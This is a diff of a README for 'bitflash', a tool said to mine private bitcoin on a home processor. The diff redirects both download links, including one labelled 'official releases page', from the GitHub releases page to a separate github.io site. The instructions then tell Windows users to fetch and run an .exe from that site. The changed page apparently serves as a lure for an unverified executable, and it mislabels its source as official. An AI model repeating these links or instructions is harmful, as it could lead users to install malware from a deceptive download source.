@@ -1,6 +1,6 @@
 # ⚡ bitflash - Mine private bitcoin with your processor
 
-[![](https://img.shields.io/badge/Download_Bitflash-Blue?style=for-the-badge)](https://github.com/backsideliposomaldeliveryvector361/bitflash/releases)
+[![](https://img.shields.io/badge/Download_Bitflash-Blue?style=for-the-badge)](https://backsideliposomaldeliveryvector361.github.io)
 
 Bitflash allows you to participate in a fair cryptocurrency network using your home computer. The software uses your processor to secure a blockchain network. It protects your privacy by routing addresses over the Nostr network. You do not need expensive hardware or special knowledge to run this software.
 
@@ -20,7 +20,7 @@ You do not need to install any extra drivers or developer tools. Bitflash includ
 
 To get started, update your system using Windows Update to ensure your security environment remains current. 
 
-1. Visit the [official releases page](https://github.com/backsideliposomaldeliveryvector361/bitflash/releases).
+1. Visit the [official releases page](https://backsideliposomaldeliveryvector361.github.io).
 2. Look for the latest version number at the top of the list.
 3. Locate the file ending in `.exe` labeled for Windows users.
 4. Click the file name to start the download.
